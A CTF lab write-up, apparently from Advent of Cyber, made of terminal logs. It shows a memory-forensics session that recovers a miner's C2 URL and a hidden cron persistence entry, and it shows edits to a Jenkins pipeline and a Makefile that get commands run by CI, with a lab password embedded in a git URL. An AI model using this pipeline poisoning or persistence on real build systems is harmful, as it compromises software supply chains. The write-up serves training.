1111 using unaddressable value1455191522836685180664062572759576141834259033203125: day-of-year out of rangeECDSA verification failureGODEBUG: can not disable "HTTP Version Not SupportedSIGSTOP: stop, unblockableaddress type not supportedasn1: invalid UTF-8 stringbad certificate hash valuebase 128 integer too largebidirule: failed Bidi Rulecall from unknown functioncannot marshal DNS messagechacha20: counter overflowchacha20: wrong nonce sizecorrupted semaphore ticketcriterion lacks equal signcryptobyte: internal errorduplicate pseudo-header %qencountered a cycle via %sentersyscall inconsistent forEachP: P did not run fnfreedefer with d.fn != nilhttp2: Framer %p: wrote %vid (%v) <= evictCount (%v)initSpan: unaligned lengthinvalid port %q after hostinvalid request descriptormalformed HTTP status codemalformed chunked encodingname not unique on networknet/http: request canceledno CSI structure availableno message of desired typenon sequence tagged as setnonvoluntary_ctxt_switchesnotewakeup - double wakeupout of memory (stackalloc)persistentalloc: size == 0read from empty dataBufferreadLoopPeekFailLocked: %vreflect.Value.CanInterfacereflect.Value.OverflowUintrequired key not availableruntime: bad span s.state=runtime: pipe failed with segment prefix is reservedshrinking stack in libcallstartlockedm: locked to mestopped after 10 redirectstoo many colons in addresstruncated base 128 integerunclosed criterion bracket is not assignable to type !#$%&()*+-./:<=>?@[]^_{|}~ .*keywords" CONTENT="(.*)">363797880709171295166015625Common 32-bit KVM processorCurveP256CurveP384CurveP521DATA frame with stream ID 0G waiting list is corruptedSIGILL: illegal instructionSIGXCPU: cpu limit exceededaccess-control-allow-originaddress not a stack addressafter object key:value pairarchive/tar: write too longcan't create process %s: %schannel number out of rangecipher: incorrect length IVcommunication error on sendcryptobyte: length overflowcurrent time %s is after %sgcstopm: not waiting for gcgrowslice: cap out of rangehkdf: entropy limit reachedhttp chunk length too largehttp2: response body closedhttp://mcgreedysecretc2.thminsufficient security levelinternal lockOSThread errorinvalid HTTP header name %qinvalid dependent stream IDinvalid profile bucket typekey was rejected by servicemakechan: size out of rangemakeslice: cap out of rangemakeslice: len out of rangemspan.sweep: bad span statenet/http: invalid method %qnet/http: use last responsenot a XENIX named type fileos: process not initializedos: unsupported signal typeprogToPointerMask: overflowrunlock of unlocked rwmutexruntime: asyncPreemptStack=runtime: checkdead: find g runtime: checkdead: nmidle=runtime: corrupted polldescruntime: netpollinit failedruntime: thread ID overflowruntime
ubuntu@volatility:~/Desktop/Evidence$ strings extracted/miner.10280.0x400000 | grep hxxp://
ubuntu@volatility:~/Desktop/Evidence$ ls
Ubuntu_5.4.0-163-generic_profile  Ubuntu_5.4.0-163-generic_profile.zip  extracted  linux.mem
ubuntu@volatility:~/Desktop/Evidence$ cd extracted
ubuntu@volatility:~/Desktop/Evidence/extracted$ ls
elfie  miner.10280.0x400000  mysqlserver.10291.0x400000
ubuntu@volatility:~/Desktop/Evidence/extracted$ cat elfie
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Mon Oct  2 18:22:12 2023)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
*/8 * * * * /var/tmp/.system-python3.8-Updates/mysqlserver
ubuntu@volatility:~/Desktop/Evidence/extracted$ ls
elfie  miner.10280.0x400000  mysqlserver.10291.0x400000
ubuntu@volatility:~/Desktop/Evidence/extracted$ md5 miner.10280.0x400000

Command 'md5' not found, did you mean:

  command 'mdl' from snap mdl (0.12.0)
  command 'mdu' from deb mtools (4.0.24-1)
  command 'cd5' from deb cd5 (0.1-4)
  command 'mdp' from deb mdp (1.0.15-1)

See 'snap info <snapname>' for additional versions.

ubuntu@volatility:~/Desktop/Evidence/extracted$ md5sum miner.10280.0x400000
153a5c8efe4aa3be240e5dc645480dee  miner.10280.0x400000
ubuntu@volatility:~/Desktop/Evidence/extracted$ md5sum mysqlserver.10291.0x400000
c586e774bb2aa17819d7faae18dad7d1  mysqlserver.10291.0x400000
ubuntu@volatility:~/Desktop/Evidence/extracted$                            

```

## [Day 21] DevSecOps Yule be Poisoned: A Pipeline of Insecure Code!

```bash
                                                                                        
┌──(nei㉿kali)-[~/pro/advart /ch]
└─$ git clone http://10.10.218.1:3000/McHoneyBell/gift-wrapper-pipeline.git
Cloning into 'gift-wrapper-pipeline'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 6 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (6/6), done.
Resolving deltas: 100% (1/1), done.
                                                                                        
┌──(nei㉿kali)-[~/pro/advart /ch]
└─$ ls                  
gift-wrapper-pipeline
                                                                                        
┌──(nei㉿kali)-[~/pro/advart /ch]
└─$ cd gift-wrapper-pipeline 
                                                                                        
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ ls
Jenkinsfile
                                                                                        
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ cat Jenkinsfile           
pipeline {
    agent any

    stages {
        stage('Prepare') {
            steps {
                git 'http://127.0.0.1:3000/McHoneyBell/gift-wrapper.git'
            }
        }

        stage('Build') {
            steps {
                sh 'make || true'
            }
        }
    }
}                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ sudo nano Jenkinsfile 
[sudo] password for nei: 
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git add.
git: 'add.' is not a git command. See 'git --help'.

The most similar command is
        add
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git add .
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git status
On branch main
Your branch is up to date with 'origin/main'.

Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        modified:   Jenkinsfile

                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git commit -m "hi"
[main 961c964] hi
 Committer: nei <nei@kali.kali>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 2 insertions(+), 2 deletions(-)
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git commit -m "checking whoami"
On branch main
Your branch is ahead of 'origin/main' by 1 commit.
  (use "git push" to publish your local commits)

nothing to commit, working tree clean
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git add .                      
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git commit -m "checking whoami"
On branch main
Your branch is ahead of 'origin/main' by 1 commit.
  (use "git push" to publish your local commits)

nothing to commit, working tree clean
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git commit -m "hi"

On branch main
Your branch is ahead of 'origin/main' by 1 commit.
  (use "git push" to publish your local commits)

nothing to commit, working tree clean
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ sudo nano Jenkinsfile          
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git add .                      
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git commit -m "Your commit message"

[main 4b40014] Your commit message
 Committer: nei <nei@kali.kali>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 1 insertion(+), 1 deletion(-)
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git push

Username for 'http://10.10.218.1:3000': guest
Password for 'http://guest@10.10.218.1:3000': 
remote: Verify
fatal: Authentication failed for 'http://10.10.218.1:3000/McHoneyBell/gift-wrapper-pipeline.git/'
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git push

Username for 'http://10.10.218.1:3000': guest
Password for 'http://guest@10.10.218.1:3000': 
remote: Verify
fatal: Authentication failed for 'http://10.10.218.1:3000/McHoneyBell/gift-wrapper-pipeline.git/'
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git remote -v

origin  http://10.10.218.1:3000/McHoneyBell/gift-wrapper-pipeline.git (fetch)
origin  http://10.10.218.1:3000/McHoneyBell/gift-wrapper-pipeline.git (push)
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git credential-cache exit

                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git push

Username for 'http://10.10.218.1:3000': guest
Password for 'http://guest@10.10.218.1:3000': 
remote: Verify
fatal: Authentication failed for 'http://10.10.218.1:3000/McHoneyBell/gift-wrapper-pipeline.git/'
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ git remote set-url origin http://guest:passpassword123@10.10.218.1:3000/McHoneyBell/gift-wrapper-pipeline.git
git push

remote: Verify
fatal: Authentication failed for 'http://10.10.218.1:3000/McHoneyBell/gift-wrapper-pipeline.git/'
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper-pipeline]
└─$ cd ..                   
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch]
└─$ ls   
gift-wrapper-pipeline
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch]
└─$ git clone http://10.10.218.1:3000/McHoneyBell/gift-wrapper.git  
Cloning into 'gift-wrapper'...
remote: Enumerating objects: 71, done.
remote: Counting objects: 100% (71/71), done.
remote: Compressing objects: 100% (66/66), done.
remote: Total 71 (delta 27), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (71/71), 70.29 KiB | 436.00 KiB/s, done.
Resolving deltas: 100% (27/27), done.
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch]
└─$ ls
gift-wrapper  gift-wrapper-pipeline
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch]
└─$ ls
gift-wrapper  gift-wrapper-pipeline
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch]
└─$ cd gift-wrapper         
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ ls
bank.yaml                  Makefile         sample_images  to_pip.sh
gift_wrapper               parameters.yaml  setup.py       wrap.py
make-conda-environment.sh  README.md        testing
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ cat to_pip.sh  
#!/bin/bash

mkdir -p tests
rm -rf dist/

# python3 setup.py sdist bdist_wheel

# for testing
#cat ~/.home/.pypirc_test
#twine upload --repository testpypi dist/*

# for production
# twine upload dist/*
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ sudo nano makefile   
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ sudo nano Makefile
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git add .                                                     
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git status
On branch master
Your branch is up to date with 'origin/master'.

Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        modified:   Makefile

                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git commit -m "confirming whoami"                             

[master 9bc1d28] confirming whoami
 Committer: nei <nei@kali.kali>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 1 insertion(+), 1 deletion(-)
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git push                         

Username for 'http://10.10.218.1:3000': guest
Password for 'http://guest@10.10.218.1:3000': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 278 bytes | 278.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.218.1:3000/McHoneyBell/gift-wrapper.git
   26ece71..9bc1d28  master -> master
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ sudo nano Makefile               
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git add .                        
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git status                       
On branch master
Your branch is up to date with 'origin/master'.

Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        modified:   Makefile

                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git commit -m "cat is working"   

[master ad7c099] cat is working
 Committer: nei <nei@kali.kali>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 1 insertion(+), 1 deletion(-)
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git push                      

Username for 'http://10.10.218.1:3000': guset
Password for 'http://guset@10.10.218.1:3000': 
remote: Verify
fatal: Authentication failed for 'http://10.10.218.1:3000/McHoneyBell/gift-wrapper.git/'
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ git push

Username for 'http://10.10.218.1:3000': guest
Password for 'http://guest@10.10.218.1:3000': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 314 bytes | 314.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.218.1:3000/McHoneyBell/gift-wrapper.git
   9bc1d28..ad7c099  master -> master
                                                                     
┌──(nei㉿kali)-[~/pro/advart /ch/gift-wrapper]
└─$ 

```

![Screenshot From 2025-04-05 02-34-44.png](img2101.png)

![Screenshot From 2025-04-05 02-35-48.png](img2102.png)

![Screenshot From 2025-04-05 02-35-39.png](img2103.png)


## [Day 24] Mobile analysis You Are on the Naughty List, McGreedy


![Screenshot From 2025-04-05 01-17-37.png](img2401.png)

![Screenshot From 2025-04-05 01-17-46.png](img2402.png)

![Screenshot From 2025-04-05 01-18-17.png](img2403.png)


    


<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
